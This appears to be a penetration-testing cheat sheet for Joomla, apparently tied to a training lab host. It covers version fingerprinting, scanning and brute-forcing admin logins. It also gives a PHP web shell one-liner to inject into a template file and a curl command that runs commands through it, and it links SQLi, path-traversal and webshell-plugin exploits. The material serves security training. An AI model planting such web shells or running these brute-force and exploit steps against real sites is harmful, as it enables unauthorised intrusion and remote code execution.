# Joomla

## Discovery & Enumeration
[Joomla](https://www.joomla.org/), released in August 2005 is another free and open-source CMS used for discussion forums, photo galleries, e-Commerce, user-based communities, and more. It is written in PHP and uses MySQL in the backend. Like WordPress, Joomla can be enhanced with over 7,000 extensions and over 1,000 templates. There are up to 2.5 million sites on the internet running Joomla. Here are some interesting [statistics](https://websitebuilder.org/blog/joomla-statistics/) about Joomla.

Joomla collects some anonymous [usage statistics](https://developer.joomla.org/about/stats.html) such as the breakdown of Joomla, PHP and database versions and server operating systems in use on Joomla installations. This data can be queried via their public [API](https://developer.joomla.org/about/stats/api.html) to see at the end how many installs (3.2 million and more).
`curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool`
### Discovery/Footprinting
```sh
# Look at the source code
curl -s http://dev.inlanefreight.local/ | grep Joomla
# robots.txt
curl -s http://dev.inlanefreight.local/robots.txt
# README.txt if present
curl -s http://dev.inlanefreight.local/README.txt | head -n 5
# In certain Joomla installs, we may be able to fingerprint the version from JavaScript files in the `media/system/js/` directory or by browsing to `administrator/manifests/files/joomla.xml`
curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
# The `cache.xml` file can help to give us the approximate version. It is located at `plugins/system/cache/cache.xml`
curl -s http://dev.inlanefreight.local/plugins/system/cache/cache.xml
```
### Enumeration
```sh
https://github.com/droope/droopescan
pip3 install droopescan
droopescan scan --help
# Run a scan
droopescan scan joomla --url http://dev.inlanefreight.local/

######### JoomlaScan 
https://github.com/drego85/JoomlaScan
# It requires Python 2.7 -> alternative installation
curl https://pyenv.run | bash
echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(pyenv init -)"' >> ~/.bashrc
source ~/.bashrc
pyenv install 2.7
pyenv shell 2.7
python2.7 -m pip install urllib3
python2.7 -m pip install certifi
python2.7 -m pip install bs4
# While a bit out of date, it can be helpful in our enumeration. Let's run a scan.
python2.7 joomlascan.py -u http://dev.inlanefreight.local
# While not as valuable as droopescan, this tool can help us find accessible directories and files and may help with fingerprinting installed extensions.

# The administrator login portal is located at `http://dev.inlanefreight.local/administrator/index.php`. Attempts at user enumeration return a generic error message.
Warning
Username and password do not match or you do not have an account yet.
# Default administrator account on Joomla is admin -> password can only be guessed if it is very weak/common
https://github.com/ajnik/joomla-bruteforce
python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```
## Attacking
### Abusing Built-In Functionality
After we get admin creds, we go to `/administrator`. We would like to add a snippet of PHP code to gain RCE. We can do this by customizing a template.

If you receive an error stating "An error has occurred. Call to a member function format() on null" after logging in, navigate to "http://dev.inlanefreight.local/administrator/index.php?option=com_plugins" and disable the "Quick Icon - PHP Version Check" plugin. This will allow the control panel to display properly.

`Templates` > `Configuration` > Choose one under the `Template` column header. 

Finally, we can click on a page to pull up the page source. It is a good idea to get in the habit of **using non-standard file names and parameters for our web shells** to not make them easily accessible to a "drive-by" attacker during the assessment. We can **also password protect and even limit access down to our source IP address**. Also, we must always remember to clean up web shells as soon as we are done with them but still include the file name, file hash, and location in our final report to the client.
```sh
# Click on a template and select a page, for example error.php page. We'll add a PHP one-liner at the top of the page to gain code execution as follows.
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
# Once this is in, click on `Save & Close` at the top and confirm code execution using `cURL`.
curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
```
### Leveraging Known Vulnerabilities
```sh
# Let's dig into a Joomla core vulnerability that affects version `3.9.4`
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945
https://www.exploit-db.com/exploits/46710
# python3 version
https://github.com/dpgg101/CVE-2019-10945
# We can run the script by specifying the `--url`, `--username`, `--password`, and `--dir` flags. 
# As pentesters, this would only be useful to us if the admin login portal is not accessible from the outside since, armed with admin creds, we can gain remote code execution, as we saw above.
python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
```


<pre class="language-bash" data-overflow="wrap" data-full-width="true"><code class="lang-bash"># Find Joomla version
<strong>/administrator/manifests/files/joomla.xml
</strong>
# JoomlaScan
https://github.com/drego85/JoomlaScan

# Joomscan
joomscan -u  http://10.11.1.111 
joomscan -u  http://10.11.1.111 --enumerate-components

# Juumla
# https://github.com/knightm4re/juumla
python3 main.py -u https://example.com

droopescan scan joomla -u http://10.11.1.111
python3 cmseek.py -u domain.com
vulnx -u https://example.com/ --cms --dns -d -w -e
python3 cmsmap.py https://www.example.com -F

# Bruteforce
<strong># https://github.com/ajnik/joomla-bruteforce
</strong># https://nmap.org/nsedoc/scripts/http-joomla-brute.html
# If lots of valid credentials, most likely the first one is the good one
joomla-brute.py -u http://$IP/$PATH -w cewl -U users 
nmap -sV --script http-joomla-brute
  --script-args 'userdb=users.txt,passdb=passwds.txt,http-joomla-brute.uri=/joomla/.../index.php,
                 http-joomla-brute.threads=100,brute.firstonly=true' &#x3C;target>

# Joomla &#x3C;= 3.7.x SQLi (Unauthenticated)
https://github.com/stefanlucas/Exploit-Joomla

# Authenticated RCE
# https://www.hackingarticles.in/joomla-reverse-shell/
Exploits > CVE-2023-23752
Option 1-> Go to Administration Templates > edit index.php and place our PHP code > Save
Option 2 -> Go to Site Templates -> modify error.php instead of index.php (with index we could break the site)
Option 3 -> Upload vuln plugin https://github.com/p0dalirius/Joomla-webshell-plugin
https://vulncheck.com/blog/joomla-for-rce
# WEBSHELL PLUGIN RCE
https://github.com/p0dalirius/Joomla-webshell-plugin
https://docs.joomla.org/J4.x:Creating_a_Plugin_for_Joomla
https://youtu.be/sdF8YSPHql4?t=259

# ALTERNATIVE: create new PHP file and then go to (in case Protostar template) /templates/protostar/webshell.php

# Check common files
README.txt
htaccess.txt
web.config.txt
configuration.php
LICENSE.txt
administrator
administrator/index.php # Default admin login
index.php?option=&#x3C;nameofplugin>
administrator/manifests/files/joomla.xml
plugins/system/cache/cache.xml
</code></pre>
